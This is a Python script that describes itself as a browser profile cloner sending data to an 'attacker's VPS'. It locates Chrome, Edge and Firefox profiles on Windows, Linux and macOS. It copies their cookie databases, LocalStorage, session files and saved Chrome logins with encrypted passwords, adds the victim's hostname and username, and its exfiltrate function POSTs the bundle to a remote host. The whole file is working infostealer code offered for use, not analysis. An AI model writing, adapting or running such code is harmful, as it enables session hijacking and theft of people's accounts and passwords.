#!/usr/bin/env python3
"""
Browser Profile Cloner — extracts cookies + LocalStorage from Chrome/Firefox/Edge
Sends them back through the active tunnel to attacker's VPS.
Supports: Windows, Linux, macOS

Output format: JSON with per-browser cookie jars + LocalStorage dumps
"""

import os
import sys
import json
import sqlite3
import shutil
import tempfile
import base64
from pathlib import Path
from datetime import datetime

# Browser profile paths per OS
BROWSER_PATHS = {
    'linux': {
        'chrome': [
            '~/.config/google-chrome/Default',
            '~/.config/chromium/Default',
            '~/.config/google-chrome-stable/Default',
        ],
        'firefox': [
            '~/.mozilla/firefox/*.default-release',
            '~/.mozilla/firefox/*.default',
        ],
    },
    'windows': {
        'chrome': [
            '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default',
            '%LOCALAPPDATA%\\Chromium\\User Data\\Default',
        ],
        'edge': [
            '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default',
        ],
        'firefox': [
            '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release',
            '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default',
        ],
    },
    'darwin': {
        'chrome': [
            '~/Library/Application Support/Google/Chrome/Default',
        ],
        'firefox': [
            '~/Library/Application Support/Firefox/Profiles/*.default-release',
        ],
    },
}

def expand_path(path_str: str) -> str:
    """Expand ~ and env vars in path."""
    result = os.path.expanduser(path_str)
    result = os.path.expandvars(result)
    return result

def find_browser_profiles() -> dict:
    """Find all browser profile directories on the system."""
    os_name = sys.platform  # 'linux', 'win32', 'darwin'
    profiles = {}
    
    browser_map = BROWSER_PATHS.get(os_name, BROWSER_PATHS['linux'])
    
    for browser, patterns in browser_map.items():
        found = []
        for pattern in patterns:
            expanded = expand_path(pattern)
            if '*' in expanded:
                import glob
                found.extend([p for p in glob.glob(expanded) if os.path.isdir(p)])
            elif os.path.isdir(expanded):
                found.append(expanded)
        if found:
            profiles[browser] = found
    
    return profiles

def extract_chrome_cookies(profile_dir: str) -> dict:
    """Extract cookies from Chrome/Chromium/Edge profile."""
    cookies_file = os.path.join(profile_dir, 'Network', 'Cookies')
    if not os.path.exists(cookies_file):
        cookies_file = os.path.join(profile_dir, 'Cookies')
    
    if not os.path.exists(cookies_file):
        return {'error': 'Cookies file not found'}
    
    # Copy to temp (SQLite is locked while browser is open)
    tmp = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
    shutil.copy2(cookies_file, tmp.name)
    tmp.close()
    
    try:
        conn = sqlite3.connect(tmp.name)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        # Get all non-session cookies
        cursor.execute("""
            SELECT host_key, name, encrypted_value, path, expires_utc, 
                   is_secure, is_httponly, has_expires, is_persistent
            FROM cookies
            WHERE LENGTH(encrypted_value) > 0
        """)
        
        cookies = []
        for row in cursor.fetchall():
            cookie = dict(row)
            # Base64 encode encrypted value for transport
            cookie['encrypted_value'] = base64.b64encode(cookie['encrypted_value']).decode()
            cookies.append(cookie)
        
        conn.close()
        
        # Also get Local Storage
        ls_data = extract_chrome_localstorage(profile_dir)
        
        return {
            'cookies': cookies,
            'count': len(cookies),
            'localStorage': ls_data,
            'profile_dir': profile_dir,
        }
    except Exception as e:
        return {'error': str(e), 'profile_dir': profile_dir}
    finally:
        os.unlink(tmp.name)

def extract_chrome_localstorage(profile_dir: str) -> dict:
    """Extract LocalStorage from Chrome profile (LevelDB)."""
    ls_dir = os.path.join(profile_dir, 'Local Storage', 'leveldb')
    if not os.path.isdir(ls_dir):
        return {}
    
    data = {}
    try:
        for fname in os.listdir(ls_dir):
            if fname.endswith('.ldb') or fname.endswith('.log'):
                fpath = os.path.join(ls_dir, fname)
                with open(fpath, 'rb') as f:
                    content = f.read()
                    # Try to find key-value pairs (rough extraction)
                    # Full LevelDB parsing is complex; this gets most plaintext values
                    data[fname] = {
                        'size': len(content),
                        'sample': base64.b64encode(content[:500]).decode(),
                    }
    except Exception as e:
        data['_error'] = str(e)
    
    return data

def extract_firefox_cookies(profile_dir: str) -> dict:
    """Extract cookies from Firefox profile."""
    cookies_file = os.path.join(profile_dir, 'cookies.sqlite')
    if not os.path.exists(cookies_file):
        return {'error': 'cookies.sqlite not found'}
    
    tmp = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
    shutil.copy2(cookies_file, tmp.name)
    tmp.close()
    
    try:
        conn = sqlite3.connect(tmp.name)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT host, name, value, path, expiry, isSecure, isHttpOnly, 
                   sameSite, originAttributes
            FROM moz_cookies
        """)
        
        cookies = [dict(row) for row in cursor.fetchall()]
        conn.close()
        
        return {
            'cookies': cookies,
            'count': len(cookies),
            'profile_dir': profile_dir,
        }
    except Exception as e:
        return {'error': str(e), 'profile_dir': profile_dir}
    finally:
        os.unlink(tmp.name)

def extract_sessions(profile_dir: str) -> list:
    """Extract Session Storage files."""
    session_dir = os.path.join(profile_dir, 'Sessions')
    if not os.path.isdir(session_dir):
        return []
    
    sessions = []
    for fname in sorted(os.listdir(session_dir)):
        fpath = os.path.join(session_dir, fname)
        if os.path.isfile(fpath):
            with open(fpath, 'rb') as f:
                content = f.read()
            sessions.append({
                'file': fname,
                'size': len(content),
                'data': base64.b64encode(content).decode(),
            })
    return sessions

def get_saved_logins(profile_dir: str) -> list:
    """Extract saved passwords from Chrome Login Data."""
    login_file = os.path.join(profile_dir, 'Login Data')
    if not os.path.exists(login_file):
        return []
    
    tmp = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
    shutil.copy2(login_file, tmp.name)
    tmp.close()
    
    try:
        conn = sqlite3.connect(tmp.name)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        logins = [dict(row) for row in cursor.fetchall()]
        # Don't b64 the passwords — they're already encrypted
        for l in logins:
            l['password_value'] = base64.b64encode(l['password_value']).decode() if l['password_value'] else None
        conn.close()
        return logins
    except Exception:
        return []
    finally:
        os.unlink(tmp.name)

def clone_all() -> dict:
    """Main entry: clone all browser profiles and return structured data."""
    profiles = find_browser_profiles()
    result = {
        'timestamp': datetime.utcnow().isoformat(),
        'hostname': os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', 'unknown'),
        'platform': sys.platform,
        'username': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
        'browsers': {},
    }
    
    for browser, paths in profiles.items():
        result['browsers'][browser] = []
        for profile_dir in paths:
            entry = {'profile': profile_dir}
            
            if browser in ('chrome', 'edge', 'chromium'):
                entry.update(extract_chrome_cookies(profile_dir))
                entry['logins'] = get_saved_logins(profile_dir)
            elif browser == 'firefox':
                entry.update(extract_firefox_cookies(profile_dir))
            
            entry['sessions'] = extract_sessions(profile_dir)
            result['browsers'][browser].append(entry)
    
    return result

def exfiltrate(data: dict, vps_host: str, vps_port: str = '8082') -> bool:
    """Send cloned data back to VPS via HTTP POST."""
    try:
        import urllib.request
        url = f'http://{vps_host}:{vps_port}/ingest/cookies'
        req = urllib.request.Request(
            url,
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json', 'X-Browser-Cloner': 'hermes'},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception:
        return False

if __name__ == '__main__':
    output = 'stdout'
    vps_host = None
    vps_port = '8082'
    
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == '--exfil' and i + 1 < len(args):
            vps_host = args[i + 1]
            i += 2
        elif args[i] == '--exfil-port' and i + 1 < len(args):
            vps_port = args[i + 1]
            i += 2
        elif args[i] == '--output' and i + 1 < len(args):
            output = args[i + 1]
            i += 2
        else:
            i += 1
    
    print(f'[*] Cloning browser profiles...', file=sys.stderr)
    data = clone_all()
    
    browser_count = len(data['browsers'])
    cookie_count = sum(
        sum(len(p.get('cookies', [])) for p in profiles if 'cookies' in p)
        for profiles in data['browsers'].values()
    )
    print(f'[*] Found {browser_count} browsers, {cookie_count} cookies', file=sys.stderr)
    
    if vps_host:
        print(f'[*] Exfiltrating to {vps_host}:{vps_port}...', file=sys.stderr)
        success = exfiltrate(data, vps_host, vps_port)
        print(f'[*] Exfil {"OK" if success else "FAILED"}', file=sys.stderr)
    
    if output == 'stdout':
        print(json.dumps(data, indent=2))
    elif output != 'none':
        with open(output, 'w') as f:
            json.dump(data, f)
        print(f'[*] Saved to {output}', file=sys.stderr)
